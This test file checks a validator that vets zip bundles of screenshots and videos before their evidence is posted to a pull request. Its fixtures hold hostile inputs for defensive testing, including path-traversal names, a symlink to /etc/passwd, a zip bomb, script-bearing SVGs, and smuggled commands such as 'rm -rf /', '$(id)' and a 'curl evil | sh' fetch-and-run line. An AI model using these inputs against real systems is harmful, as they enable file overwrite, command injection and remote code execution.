import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import zlib from 'node:zlib';

import { describe, it } from 'vitest';

import {
  downloadArtifact,
  evidenceBlock,
  evidenceMarkers,
  fetchStep,
  LIMITS,
  listZip,
  main,
  parseManifest,
  publishStep,
  pullRequestMismatch,
  Refused,
  sessionRunMismatch,
  validateBundle,
  withEvidenceBlock,
  workflowCommand,
} from './verify-attach.mjs';

const sha256 = data => createHash('sha256').update(data).digest('hex');
const COMMIT = '0f50b597b1c2d3e4f5a60718293a4b5c6d7e8f90';
const REPO = 'clerk/clerk-ios';
const PNG = Buffer.concat([
  Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
  Buffer.from('the rest of a screenshot'),
]);
const JPG = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0]), Buffer.from('the rest of a photo')]);
const MP4 = Buffer.concat([Buffer.from([0, 0, 0, 0x18]), Buffer.from('ftypmp42'), Buffer.alloc(4096, 'v')]);

const manifestFor = (files, change = {}) => ({
  v: 2,
  pr: 669,
  run: 'r20261008-052713-253e',
  platform: 'ios',
  device: 'iPhone Air on xcode-27',
  commit: COMMIT,
  passed: 3,
  flaky: 0,
  total: 3,
  files: files.map(([name, data]) => ({ name, bytes: data.length, sha256: sha256(data) })),
  before: null,
  ...change,
});

const MEDIA = [
  ['video.mp4', MP4],
  ['profile.png', PNG],
];
const GOOD = manifestFor(MEDIA);

function zip(entries, { trailing = Buffer.alloc(0), count, disk = 0 } = {}) {
  const locals = [];
  const centrals = [];
  let offset = 0;
  for (const entry of entries) {
    const method = entry.method ?? 8;
    const packed = entry.packed ?? (method === 8 ? zlib.deflateRawSync(entry.data) : entry.data);
    const fields = {
      madeBy: (3 << 8) | 20,
      flags: 0,
      method,
      crc: zlib.crc32(entry.data),
      packedBytes: packed.length,
      bytes: entry.data.length,
      name: entry.name,
      attributes: (entry.mode ?? 0o100644) * 65536,
      offset,
      ...entry.central,
    };
    const localFields = { ...fields, ...entry.local };
    const header = (f, central) => {
      const name = Buffer.from(f.name, 'latin1');
      const head = Buffer.alloc(central ? 46 : 30);
      head.writeUInt32LE(central ? 0x02014b50 : 0x04034b50, 0);
      let at = 4;
      if (central) {
        at = head.writeUInt16LE(f.madeBy, at);
      }
      at = head.writeUInt16LE(20, at);
      at = head.writeUInt16LE(f.flags, at);
      at = head.writeUInt16LE(f.method, at);
      at = head.writeUInt32LE(0, at);
      at = head.writeUInt32LE(f.crc, at);
      at = head.writeUInt32LE(f.packedBytes, at);
      at = head.writeUInt32LE(f.bytes, at);
      at = head.writeUInt16LE(name.length, at);
      at = head.writeUInt16LE(0, at);
      if (central) {
        at = head.writeUInt16LE(0, at);
        at = head.writeUInt16LE(0, at);
        at = head.writeUInt16LE(0, at);
        at = head.writeUInt32LE(f.attributes >>> 0, at);
        head.writeUInt32LE(f.offset, at);
      }
      return Buffer.concat([head, name]);
    };
    const local = Buffer.concat([header(localFields, false), packed]);
    locals.push(local);
    centrals.push(header(fields, true));
    offset += local.length;
  }
  const directory = Buffer.concat(centrals);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0);
  end.writeUInt16LE(disk, 4);
  end.writeUInt16LE(count ?? entries.length, 8);
  end.writeUInt16LE(count ?? entries.length, 10);
  end.writeUInt32LE(directory.length, 12);
  end.writeUInt32LE(offset, 16);
  return Buffer.concat([...locals, directory, trailing, end]);
}

const bundle = (manifest = GOOD, media = MEDIA, extra = []) =>
  zip([
    { name: 'manifest.json', data: Buffer.from(JSON.stringify(manifest)) },
    ...media.map(([name, data]) => ({ name, data })),
    ...extra,
  ]);
const refusal = attempt => {
  try {
    attempt();
  } catch (error) {
    if (error instanceof Refused) {
      return error.message;
    }
    throw error;
  }
  return null;
};

const BEFORE_COMMIT = '5e126375065188df5bec4e4e75d61db03834f395';
const WAS_MP4 = Buffer.concat([MP4, Buffer.from('before')]);
const WAS_PNG = Buffer.concat([PNG, Buffer.from('before')]);
const WAS_MEDIA = [
  ['before-video.mp4', WAS_MP4],
  ['before-profile.png', WAS_PNG],
];
const beforeFor = (files, change = {}) => ({
  run: 'r20261008-051500-0a1b',
  commit: BEFORE_COMMIT,
  passed: 0,
  flaky: 0,
  total: 3,
  files: files.map(([name, data]) => ({ name, bytes: data.length, sha256: sha256(data) })),
  ...change,
});
const WITH_BEFORE = manifestFor(MEDIA, { before: beforeFor(WAS_MEDIA) });

describe('the archive of a session', () => {
  it('accepts a manifest with the files it names, deflated or stored, and returns their bytes', () => {
    for (const method of [8, 0]) {
      const accepted = validateBundle(
        zip([
          { name: 'manifest.json', data: Buffer.from(JSON.stringify(GOOD)), method },
          { name: 'video.mp4', data: MP4, method },
          { name: 'profile.png', data: PNG, method },
        ]),
      );
      assert.deepEqual(accepted.manifest, GOOD);
      assert.deepEqual(accepted.files, [
        { name: 'video.mp4', data: MP4 },
        { name: 'profile.png', data: PNG },
      ]);
    }
    const jpg = manifestFor([['photo.jpg', JPG]]);
    assert.deepEqual(validateBundle(bundle(jpg, [['photo.jpg', JPG]])).files, [{ name: 'photo.jpg', data: JPG }]);
  });

  it('reads sizes from the directory, as a zip written to a stream needs', () => {
    const streamed = (name, data) => ({
      name,
      data,
      central: { flags: 8 },
      local: { flags: 8, crc: 0, packedBytes: 0, bytes: 0 },
    });
    const accepted = validateBundle(
      zip([
        streamed('manifest.json', Buffer.from(JSON.stringify(GOOD))),
        streamed('video.mp4', MP4),
        streamed('profile.png', PNG),
      ]),
    );
    assert.deepEqual(
      accepted.files.map(file => file.name),
      ['video.mp4', 'profile.png'],
    );
  });

  const withEntry = entry => bundle(GOOD, MEDIA, [entry]);
  const refusedArchives = [
    ['bytes that are not a zip', Buffer.from('<html>not an archive</html>'), /not a zip archive/],
    ['an empty file', Buffer.alloc(0), /not a zip archive/],
    [
      'a path under a directory',
      withEntry({ name: 'screenshots/profile.png', data: PNG }),
      /entry 4 has a name that is not allowed/,
    ],
    [
      'a path that climbs out',
      withEntry({ name: '../../home/runner/.bashrc.png', data: PNG }),
      /entry 4 has a name that is not allowed/,
    ],
    ['an absolute path', withEntry({ name: '/etc/cron.d/x.png', data: PNG }), /entry 4 has a name that is not allowed/],
    ['a Windows path', withEntry({ name: '..\\x.png', data: PNG }), /entry 4 has a name that is not allowed/],
    [
      'a directory',
      withEntry({ name: 'shots/', data: Buffer.alloc(0), method: 0 }),
      /entry 4 has a name that is not allowed/,
    ],
    [
      'a script',
      withEntry({ name: 'run.sh', data: Buffer.from('#!/bin/sh\n') }),
      /entry 4 has a name that is not allowed/,
    ],
    [
      'a web page',
      withEntry({ name: 'page.html', data: Buffer.from('<script>') }),
      /entry 4 has a name that is not allowed/,
    ],
    [
      'an SVG',
      withEntry({ name: 'drawing.svg', data: Buffer.from('<svg onload="x">') }),
      /entry 4 has a name that is not allowed/,
    ],
    ['a hidden file', withEntry({ name: '.env.png', data: PNG }), /entry 4 has a name that is not allowed/],
    [
      'a name that reads as a flag',
      withEntry({ name: '--body-file.png', data: PNG }),
      /entry 4 has a name that is not allowed/,
    ],
    [
      'a name with a newline',
      withEntry({ name: 'a\n::set-output name=x::y.png', data: PNG }),
      /entry 4 has a name that is not allowed/,
    ],
    [
      'a symbolic link',
      withEntry({ name: 'link.png', data: Buffer.from('/etc/passwd'), mode: 0o120777, method: 0 }),
      /entry 4 is not a regular file/,
    ],
    ['an encrypted entry', withEntry({ name: 'secret.png', data: PNG, central: { flags: 1 } }), /entry 4 is encrypted/],
    [
      'a strongly encrypted entry',
      withEntry({ name: 'secret.png', data: PNG, central: { flags: 0x40 } }),
      /entry 4 is encrypted/,
    ],
    [
      'a directory by its DOS attribute',
      withEntry({ name: 'folder.png', data: PNG, central: { madeBy: 20, attributes: 0x10 } }),
      /entry 4 is not a regular file/,
    ],
    [
      'an archive that spans disks',
      zip([{ name: 'manifest.json', data: Buffer.from('{}') }], { disk: 1 }),
      /spans disks/,
    ],
    [
      'entries within their caps that unpack to more than the total',
      zip(
        Array.from({ length: 17 }, (_, i) => ({ name: `s${i}.png`, data: PNG, central: { bytes: LIMITS.imageBytes } })),
      ),
      /unpacks to more than 157286400 bytes/,
    ],
    [
      'a compression method other than deflate',
      withEntry({ name: 'odd.png', data: PNG, central: { method: 12 } }),
      /entry 4 uses a compression method/,
    ],
    ['two entries with one name', bundle(GOOD, [...MEDIA, ['Profile.png', PNG]]), /entry 4 repeats a name/],
    [
      'an image that declares more than its cap',
      withEntry({ name: 'huge.png', data: PNG, central: { bytes: LIMITS.imageBytes + 1 } }),
      /entry 4 is over the size cap for its kind/,
    ],
    [
      'a manifest that declares more than its cap',
      zip([{ name: 'manifest.json', data: Buffer.from('{}'), central: { bytes: LIMITS.manifestBytes + 1 } }]),
      /entry 1 is over the size cap/,
    ],
    [
      'more entries than the cap',
      zip(Array.from({ length: LIMITS.files + 2 }, (_, i) => ({ name: `s${i}.png`, data: PNG }))),
      /more than 51 entries/,
    ],
    ['a zip64 archive', zip([{ name: 'manifest.json', data: Buffer.from('{}') }], { count: 0xffff }), /zip64/],
    ['a manifest that names no file', bundle(manifestFor([]), []), /files must be a list of 1 to 50/],
    [
      'bytes hidden between the directory and the end record',
      zip([{ name: 'manifest.json', data: Buffer.from(JSON.stringify(GOOD)) }], {
        trailing: Buffer.from('hidden'),
      }),
      /bytes between its directory and its end record/,
    ],
    [
      'a stored entry with two sizes',
      withEntry({ name: 'odd.png', data: PNG, method: 0, central: { bytes: PNG.length + 1 } }),
      /stored with two different sizes/,
    ],
  ];
  for (const [what, archive, message] of refusedArchives) {
    it(`refuses ${what}`, () => {
      assert.match(refusal(() => validateBundle(archive)) ?? 'accepted', message);
    });
  }

  it('refuses an entry that inflates past the size its directory declares, before it holds the bytes', () => {
    const bomb = Buffer.alloc(8 * 1024 * 1024);
    const lying = manifestFor([['profile.png', PNG]]);
    const archive = zip([
      { name: 'manifest.json', data: Buffer.from(JSON.stringify(lying)) },
      { name: 'profile.png', data: PNG, packed: zlib.deflateRawSync(bomb), central: { bytes: PNG.length } },
    ]);
    assert.match(
      refusal(() => validateBundle(archive)),
      /inflates past the size the directory declares/,
    );
    const short = zip([
      { name: 'manifest.json', data: Buffer.from(JSON.stringify(lying)) },
      {
        name: 'profile.png',
        data: PNG,
        packed: zlib.deflateRawSync(PNG.subarray(0, 8)),
        central: { bytes: PNG.length },
      },
    ]);
    assert.match(
      refusal(() => validateBundle(short)),
      /does not inflate to the size the directory declares/,
    );
  });

  it('refuses an entry whose bytes fail the checksum, and one named differently beside its bytes', () => {
    const one = manifestFor([['profile.png', PNG]]);
    const corrupt = zip([
      { name: 'manifest.json', data: Buffer.from(JSON.stringify(one)) },
      { name: 'profile.png', data: PNG, central: { crc: 1 } },
    ]);
    assert.match(
      refusal(() => validateBundle(corrupt)),
      /fails its checksum/,
    );
    const twoNames = zip([
      { name: 'manifest.json', data: Buffer.from(JSON.stringify(one)) },
      { name: 'profile.png', data: PNG, local: { name: 'run.sh\0\0\0\0\0' } },
    ]);
    assert.match(
      refusal(() => validateBundle(twoNames)),
      /one name in the directory and another beside its bytes/,
    );
  });

  it('accepts the files of a before run beside the files of the run, and holds them to the same checks', () => {
    const accepted = validateBundle(bundle(WITH_BEFORE, [...MEDIA, ...WAS_MEDIA]));
    assert.deepEqual(accepted.manifest, WITH_BEFORE);
    assert.deepEqual(
      accepted.files,
      [...MEDIA, ...WAS_MEDIA].map(([name, data]) => ({ name, data })),
    );
    assert.match(
      refusal(() => validateBundle(bundle(WITH_BEFORE, MEDIA))),
      /name different files/,
    );
    assert.match(
      refusal(() => validateBundle(bundle(WITH_BEFORE, [...MEDIA, WAS_MEDIA[0], ['before-profile.png', PNG]]))),
      /file 4 is not the size its manifest declares/,
    );
    const sameSize = Buffer.concat([PNG, Buffer.from('BEFORE')]);
    assert.match(
      refusal(() => validateBundle(bundle(WITH_BEFORE, [...MEDIA, WAS_MEDIA[0], ['before-profile.png', sameSize]]))),
      /file 4 does not have the sha256 its manifest declares/,
    );
    const notAnImage = [
      ['before-video.mp4', WAS_MP4],
      ['before-profile.png', Buffer.from('<svg onload=alert(1)>')],
    ];
    assert.match(
      refusal(() =>
        validateBundle(bundle(manifestFor(MEDIA, { before: beforeFor(notAnImage) }), [...MEDIA, ...notAnImage])),
      ),
      /file 4 does not start with the bytes of its type/,
    );
  });

  it('refuses an archive with no manifest, with a file the manifest does not name, and without a file it does name', () => {
    assert.match(
      refusal(() => validateBundle(zip([{ name: 'video.mp4', data: MP4 }]))),
      /has no manifest\.json/,
    );
    assert.match(
      refusal(() => validateBundle(bundle(GOOD, [...MEDIA, ['extra.png', PNG]]))),
      /name different files/,
    );
    assert.match(
      refusal(() => validateBundle(bundle(GOOD, [MEDIA[0]]))),
      /name different files/,
    );
    assert.match(
      refusal(() => validateBundle(bundle(GOOD, [MEDIA[0], ['other.png', PNG]]))),
      /name different files/,
    );
  });

  it('refuses a file that is not the size or the sha256 its manifest declares', () => {
    const wrongSize = manifestFor(MEDIA, { files: [GOOD.files[0], { ...GOOD.files[1], bytes: PNG.length + 1 }] });
    assert.match(
      refusal(() => validateBundle(bundle(wrongSize))),
      /file 2 is not the size its manifest declares/,
    );
    const wrongSha = manifestFor(MEDIA, { files: [GOOD.files[0], { ...GOOD.files[1], sha256: sha256('other') }] });
    assert.match(
      refusal(() => validateBundle(bundle(wrongSha))),
      /file 2 does not have the sha256 its manifest declares/,
    );
  });

  it('refuses a file whose leading bytes are not those of its type', () => {
    for (const [name, data] of [
      ['page.png', Buffer.from('<html><script>alert(1)</script></html>')],
      ['clip.mp4', Buffer.from('#!/bin/sh\ncurl evil | sh\n')],
      ['photo.jpg', PNG],
      ['shot.png', JPG],
      ['tiny.mp4', Buffer.from('ftyp')],
    ]) {
      assert.match(
        refusal(() => validateBundle(bundle(manifestFor([[name, data]]), [[name, data]]))),
        /file 1 does not start with the bytes of its type/,
        name,
      );
    }
  });

  it('never repeats a name or a value from the archive in what it says', () => {
    const hostile = 'x\n::error::pwned`$(id)`.png';
    const message = refusal(() => validateBundle(bundle(GOOD, MEDIA, [{ name: hostile, data: PNG }])));
    assert.equal(message.includes('pwned'), false);
    assert.equal(
      refusal(() => parseManifest(JSON.stringify({ ...GOOD, device: '::error::pwned' }))).includes('pwned'),
      false,
    );
    assert.equal(
      refusal(() =>
        parseManifest(JSON.stringify({ ...GOOD, files: [{ ...GOOD.files[0], name: 'pwned/../x.png' }] })),
      ).includes('pwned'),
      false,
    );
  });

  it('refuses an archive over the size cap before it reads it', () => {
    const cap = LIMITS.zipBytes;
    LIMITS.zipBytes = 64;
    try {
      assert.match(
        refusal(() => listZip(bundle())),
        /the archive is over 64 bytes/,
      );
    } finally {
      LIMITS.zipBytes = cap;
    }
  });

  it('lists entries without reading their bytes', () => {
    assert.deepEqual(
      listZip(bundle()).entries.map(entry => [entry.name, entry.bytes]),
      [
        ['manifest.json', JSON.stringify(GOOD).length],
        ['video.mp4', MP4.length],
        ['profile.png', PNG.length],
      ],
    );
  });
});

describe('the manifest', () => {
  const parse = change => parseManifest(JSON.stringify({ ...GOOD, ...change }));
  const file = change => parse({ files: [{ ...GOOD.files[1], ...change }] });

  it('accepts the manifest the CLI writes', () => {
    assert.deepEqual(parseManifest(JSON.stringify(GOOD)), GOOD);
  });

  const refused = [
    ['text that is not JSON', () => parseManifest('{')],
    ['a list', () => parseManifest('[]')],
    ['a key the schema does not have', () => parse({ note: 'free text for the description' })],
    ['a missing key', () => parseManifest(JSON.stringify({ ...GOOD, device: undefined }))],
    ['a run id of another shape', () => parse({ run: 'r20261008-052713-253e`; rm -rf /' })],
    ['a run id with a newline after it', () => parse({ run: 'r20261008-052713-253e\n' })],
    ['a PR number that is text', () => parse({ pr: '669' })],
    ['a PR number that is not whole', () => parse({ pr: 6.5 })],
    ['a PR number of zero', () => parse({ pr: 0 })],
    ['a PR number past the cap', () => parse({ pr: LIMITS.pr + 1 })],
    ['a third platform', () => parse({ platform: 'web' })],
    ['a device with markdown in it', () => parse({ device: 'iPhone `Air` [x](http://evil)' })],
    ['a device with a comment marker in it', () => parse({ device: 'x <!-- /verify-evidence:ios -->' })],
    ['a short commit', () => parse({ commit: 'abc1234' })],
    ['a negative count', () => parse({ passed: -1 })],
    ['no passing test', () => parse({ passed: 0, flaky: 0 })],
    ['more passing tests than tests', () => parse({ passed: 4 })],
    ['a count past the cap', () => parse({ total: LIMITS.tests + 1 })],
    ['files that are not a list', () => parse({ files: 'video.mp4' })],
    ['no file, which would put a line of claims in the description and nothing to look at', () => parse({ files: [] })],
    [
      'more files than the cap',
      () =>
        parse({ files: Array.from({ length: LIMITS.files + 1 }, (_, i) => ({ ...GOOD.files[1], name: `s${i}.png` })) }),
    ],
    ['two videos', () => parse({ files: [GOOD.files[0], { ...GOOD.files[0], name: 'second.mp4' }] })],
    ['two files with one name', () => parse({ files: [GOOD.files[1], { ...GOOD.files[1], name: 'PROFILE.png' }] })],
    ['a name with a path separator', () => file({ name: '../profile.png' })],
    ['a name with a backslash', () => file({ name: 'a\\profile.png' })],
    ['a name that starts with a dot', () => file({ name: '.profile.png' })],
    ['a name that starts with a dash', () => file({ name: '-profile.png' })],
    ['a name with a space', () => file({ name: 'my profile.png' })],
    ['a name with a bracket', () => file({ name: 'a](http://evil).png' })],
    ['a name with a number sign, which gh reads as alt text', () => file({ name: 'a#b.png' })],
    ['an extension outside png, jpg, mp4', () => file({ name: 'profile.gif' })],
    ['an extension in capitals', () => file({ name: 'profile.PNG' })],
    ['a name with no extension', () => file({ name: 'profile' })],
    ['a name that is too long', () => file({ name: `${'a'.repeat(120)}.png` })],
    ['an empty file', () => file({ bytes: 0 })],
    ['an image over its cap', () => file({ bytes: LIMITS.imageBytes + 1 })],
    ['a video over its cap', () => parse({ files: [{ ...GOOD.files[0], bytes: LIMITS.videoBytes + 1 }] })],
    [
      'files within their caps and over the total',
      () =>
        parse({
          files: [
            { ...GOOD.files[0], bytes: LIMITS.videoBytes },
            ...Array.from({ length: 6 }, (_, i) => ({
              name: `s${i}.png`,
              bytes: LIMITS.imageBytes,
              sha256: sha256('x'),
            })),
          ],
        }),
    ],
    ['a sha256 of another shape', () => file({ sha256: 'abc' })],
    ['a file with a key the schema does not have', () => file({ path: '/etc/passwd' })],
    ['a manifest over its size cap', () => parseManifest(JSON.stringify(GOOD).padEnd(LIMITS.manifestBytes + 1, ' '))],
  ];
  for (const [what, attempt] of refused) {
    it(`refuses ${what}`, () => {
      assert.throws(attempt, Refused);
    });
  }

  it('refuses a manifest of another version before it reads anything else of it, and names both versions', () => {
    const { before: _, ...versionOne } = { ...GOOD, v: 1 };
    assert.equal(
      refusal(() => parseManifest(JSON.stringify(versionOne))),
      'the manifest is version 1, and this script publishes only version 2',
    );
    assert.equal(
      refusal(() => parseManifest(JSON.stringify({ ...GOOD, v: 3, layout: 'a key of a later version' }))),
      'the manifest is version 3, and this script publishes only version 2',
    );
    for (const v of ['2', 2.5, -1, 1000, null, '<img src=x>\n::error::pwned']) {
      assert.equal(
        refusal(() => parse({ v })),
        'the manifest is of no version this script knows, and this script publishes only version 2',
        JSON.stringify(v),
      );
    }
    assert.equal(
      refusal(() => parseManifest(JSON.stringify({ device: 'x' }))),
      'the manifest is of no version this script knows, and this script publishes only version 2',
    );
  });

  it('accepts a before run, which may have passed nothing, with one file of the same kind for each file of the run', () => {
    assert.deepEqual(parseManifest(JSON.stringify(WITH_BEFORE)), WITH_BEFORE);
  });

  const before = change => parse({ before: { ...WITH_BEFORE.before, ...change } });
  const [wasVideo, wasShot] = WITH_BEFORE.before.files;
  const refusedBefore = [
    [
      'a manifest with no before key',
      () => parseManifest(JSON.stringify({ ...GOOD, before: undefined })),
      /the manifest must have exactly the keys/,
    ],
    ['a before that is text', () => parse({ before: 'r20261008-051500-0a1b' }), /before is not an object/],
    [
      'a before with a key the schema does not have',
      () => before({ note: '<img src=x>' }),
      /before must have exactly the keys run, commit, passed, flaky, total, files/,
    ],
    [
      'a before run id with markdown in it',
      () => before({ run: 'r20261008-051500-0a1b` [x](http://evil) `' }),
      /the run of before is missing or malformed/,
    ],
    ['a before that is the run itself', () => before({ run: GOOD.run }), /before is the run itself/],
    ['a short before commit', () => before({ commit: 'abc1234' }), /the commit of before is missing or malformed/],
    [
      'a negative before count',
      () => before({ passed: -1 }),
      /passed of before must be a whole number from 0 to 10000/,
    ],
    [
      'a before count past the cap',
      () => before({ total: LIMITS.tests + 1 }),
      /total of before must be a whole number from 1 to 10000/,
    ],
    [
      'more passing before tests than tests',
      () => before({ passed: 3, flaky: 1 }),
      /passed and flaky of before must count at most total/,
    ],
    ['a before with no files', () => before({ files: [] }), /the files of before must be a list of 1 to 50/],
    [
      'a before with fewer files than the run',
      () => before({ files: [wasVideo] }),
      /before must have one file for each file, of the same kind/,
    ],
    [
      'a before screenshot where the run has a video',
      () => before({ files: [wasShot, wasVideo] }),
      /before must have one file for each file, of the same kind/,
    ],
    [
      'a before file named as a file of the run is',
      () => before({ files: [wasVideo, { ...wasShot, name: 'PROFILE.png' }] }),
      /two files have the same name/,
    ],
    [
      'a before file with a path in its name',
      () => before({ files: [wasVideo, { ...wasShot, name: '../before-profile.png' }] }),
      /the name of file 2 is missing or malformed/,
    ],
    [
      'a before file of another type',
      () => before({ files: [wasVideo, { ...wasShot, name: 'before-profile.svg' }] }),
      /the name of file 2 is missing or malformed/,
    ],
    [
      'a before image over its cap',
      () => before({ files: [wasVideo, { ...wasShot, bytes: LIMITS.imageBytes + 1 }] }),
      /the size of file 2 must be a whole number/,
    ],
    [
      'a before file with a key the schema does not have',
      () => before({ files: [wasVideo, { ...wasShot, path: '/etc/passwd' }] }),
      /file 2 must have exactly the keys name, bytes, sha256/,
    ],
  ];
  for (const [what, attempt, why] of refusedBefore) {
    it(`refuses ${what}`, () => {
      assert.throws(attempt, error => error instanceof Refused && why.test(error.message));
    });
  }

  it('refuses a run id or a commit, of the run or of the before run, with any character of markup in any place', () => {
    const MARKUP = ['|', '"', '<', '>', "'", '&', '`', '@', ':', ';', '$', '{', '}', '[', ']', '(', ')', '*', '_', '!'];
    const OTHER = [' ', '\n', '\r', '\t', '\0', '\\', '/', '#', '.', 'é', 'G', 'R'];
    const fields = [
      ['run', GOOD.run, run => parse({ run })],
      ['commit', GOOD.commit, commit => parse({ commit })],
      ['the run of before', WITH_BEFORE.before.run, run => before({ run })],
      ['the commit of before', WITH_BEFORE.before.commit, commit => before({ commit })],
    ];
    for (const [what, good, attempt] of fields) {
      assert.equal(
        refusal(() => attempt(good)),
        null,
        what,
      );
      for (const char of [...MARKUP, ...OTHER]) {
        const hostile = [
          ...Array.from(good, (_, at) => `${good.slice(0, at)}${char}${good.slice(at + 1)}`),
          `${good}${char}`,
          `${char}${good}`,
          `${good}-->`,
        ];
        for (const value of hostile) {
          assert.equal(
            refusal(() => attempt(value)),
            `${what} is missing or malformed`,
            JSON.stringify(value),
          );
        }
      }
    }
  });

  it('counts the files of the before run toward the cap on files and the cap on bytes', () => {
    const shots = (prefix, count, bytes = 1) =>
      Array.from({ length: count }, (_, i) => ({ name: `${prefix}${i}.png`, bytes, sha256: sha256('x') }));
    const paired = (count, bytes) =>
      parse({
        files: shots('s', count, bytes),
        before: { ...WITH_BEFORE.before, files: shots('before-s', count, bytes) },
      });
    assert.equal(paired(LIMITS.files / 2).before.files.length, LIMITS.files / 2);
    assert.throws(() => paired(LIMITS.files / 2 + 1), /at most 50 files in all/);
    assert.throws(() => paired(8, LIMITS.imageBytes), /the files are over 157286400 bytes in all/);
    const video = name => ({ name, bytes: LIMITS.videoBytes, sha256: sha256('x') });
    assert.throws(
      () =>
        parse({ files: [video('video.mp4')], before: { ...WITH_BEFORE.before, files: [video('before-video.mp4')] } }),
      /the files are over 157286400 bytes in all/,
    );
  });
});

describe('which runs and which pull request', () => {
  const session = { repo: REPO, headBranch: 'feature/change' };
  const pull = {
    state: 'open',
    head: { ref: 'feature/change', sha: COMMIT, repo: { full_name: REPO } },
    base: { repo: { full_name: REPO } },
  };

  it('takes evidence only from a dispatched run of the session workflow of this repository', () => {
    const run = { event: 'workflow_dispatch', path: '.github/workflows/verify-remote.yml', headRepo: REPO };
    assert.equal(sessionRunMismatch(run, REPO), null);
    assert.equal(sessionRunMismatch({ ...run, event: 'pull_request' }, REPO), 'it was not started by a dispatch');
    assert.equal(
      sessionRunMismatch({ ...run, event: 'pull_request_target' }, REPO),
      'it was not started by a dispatch',
    );
    assert.equal(
      sessionRunMismatch({ ...run, path: '.github/workflows/fork-made.yml' }, REPO),
      'it is not a run of .github/workflows/verify-remote.yml',
    );
    assert.equal(sessionRunMismatch({ ...run, headRepo: 'someone/clerk-ios' }, REPO), 'it ran for another repository');
  });

  it('publishes to the open pull request of the session branch, whatever its head commit is now', () => {
    assert.equal(pullRequestMismatch(pull, session), null);
    assert.equal(pullRequestMismatch({ ...pull, head: { ...pull.head, sha: 'b'.repeat(40) } }, session), null);
  });

  it('publishes to no other pull request, and says which rule refused it', () => {
    assert.equal(pullRequestMismatch({ ...pull, state: 'closed' }, session), 'it is not open');
    assert.equal(
      pullRequestMismatch({ ...pull, head: { ...pull.head, repo: { full_name: 'someone/clerk-ios' } } }, session),
      'its branch is in another repository',
    );
    assert.equal(
      pullRequestMismatch({ ...pull, head: { ...pull.head, repo: null } }, session),
      'its branch is in another repository',
    );
    assert.equal(
      pullRequestMismatch({ ...pull, base: { repo: { full_name: 'clerk/other' } } }, session),
      'its branch is in another repository',
    );
    assert.equal(
      pullRequestMismatch({ ...pull, head: { ...pull.head, ref: 'main' } }, session),
      'its branch is not the branch the session ran on',
    );
    assert.equal(pullRequestMismatch(null, session), 'it is not open');
    assert.equal(pullRequestMismatch({ message: 'Not Found' }, session), 'it is not open');
  });
});

const SESSION = { repo: REPO, runId: '37731397352', actor: 'octocat', pullHead: COMMIT };
const blockOf = (manifest, onDisk) => evidenceBlock(manifest, SESSION, onDisk);
const localBlock = line =>
  [
    '<!-- verify-evidence:ios -->',
    '',
    line,
    '',
    '| `profile` |',
    '| :---: |',
    '| <img src="https://github.com/user-attachments/assets/1" width="280" alt="profile"> |',
    '',
    '<!-- /verify-evidence:ios -->',
  ].join('\n');
const LOCAL_BLOCK = localBlock(
  '**Verified on an iOS simulator.** Run `r20261007-010101-aaaa` on `iPhone 17 Pro` at `0f50b597b1c2`, 3 of 3 passed.',
);
const OLDER_BLOCK = localBlock(
  'verify run `r20261007-010101-aaaa` on `iPhone 17 Pro` at `0f50b597b1c2`, 3 of 3 passed.',
);

describe('the evidence block of a pull request description', () => {
  const block = blockOf(GOOD);

  it('is one line that leads with the result in bold, says in the same sentence that the session reported it, links its run and names who started it, then each file alone in its own paragraph, between the markers of its platform', () => {
    assert.equal(
      block,
      [
        '<!-- verify-evidence:ios -->',
        '',
        '**Verified on an iOS simulator**, as reported by [the session](https://github.com/clerk/clerk-ios/actions/runs/37731397352) that `octocat` started. Run `r20261008-052713-253e` on `iPhone Air on xcode-27` at `0f50b597b1c2`, 3 of 3 passed.',
        '',
        '![video.mp4](./video.mp4)',
        '',
        '![profile](./profile.png)',
        '',
        '<!-- /verify-evidence:ios -->',
      ].join('\n'),
    );
    assert.match(
      blockOf(manifestFor(MEDIA, { passed: 1, flaky: 1, total: 2 })),
      / started\. Run `r20261008-052713-253e` on `iPhone Air on xcode-27` at `0f50b597b1c2`, 1 of 2 passed, 1 flaky \(passed only on a retry\)\.$/m,
    );
    assert.match(
      blockOf(manifestFor(MEDIA, { platform: 'android' })),
      /^\*\*Verified on an Android emulator\*\*, as reported by /m,
    );
  });

  it('says that the before run is what the session reports, links its commit so a reader can open it, and says how that run went, ahead of the note about newer commits', () => {
    const line = block => block.split('\n')[2];
    assert.equal(
      line(blockOf(WITH_BEFORE)),
      '**Verified on an iOS simulator**, as reported by [the session](https://github.com/clerk/clerk-ios/actions/runs/37731397352) that `octocat` started. Run `r20261008-052713-253e` on `iPhone Air on xcode-27` at `0f50b597b1c2`, 3 of 3 passed. The session reports the before as run `r20261008-051500-0a1b` at [`5e1263750651`](https://github.com/clerk/clerk-ios/commit/5e126375065188df5bec4e4e75d61db03834f395), 0 of 3 passed.',
    );
    assert.ok(
      line(evidenceBlock(WITH_BEFORE, { ...SESSION, repo: 'clerk/clerk-android', pullHead: 'b'.repeat(40) })).endsWith(
        ' The session reports the before as run `r20261008-051500-0a1b` at [`5e1263750651`](https://github.com/clerk/clerk-android/commit/5e126375065188df5bec4e4e75d61db03834f395), 0 of 3 passed. The pull request has newer commits.',
      ),
    );
  });

  it('says that the pull request has newer commits when its head is not the commit of the run', () => {
    const moved = evidenceBlock(GOOD, { ...SESSION, pullHead: 'b'.repeat(40) });
    assert.match(moved, / at `0f50b597b1c2`, 3 of 3 passed\. The pull request has newer commits\.$/m);
    assert.equal(block.includes('newer commits'), false);
  });

  it('links the run and names the person GitHub names, whatever the manifest says', () => {
    const elsewhere = evidenceBlock(GOOD, {
      repo: 'clerk/clerk-android',
      runId: '41',
      actor: 'someone-else',
      pullHead: COMMIT,
    });
    assert.ok(
      elsewhere.includes(
        '](https://github.com/clerk/clerk-android/actions/runs/41) that `someone-else` started. Run `r20261008-052713-253e`',
      ),
    );
    assert.equal(/actions\/runs|octocat|someone-else/.test(JSON.stringify(GOOD)), false);
  });

  it('replaces the block that attach writes from a machine whose gh can attach, in the layout of this version or of the one before it', () => {
    assert.equal(withEvidenceBlock(`intro\n\n${LOCAL_BLOCK}\n`, 'ios', block).body, `intro\n\n${block}\n`);
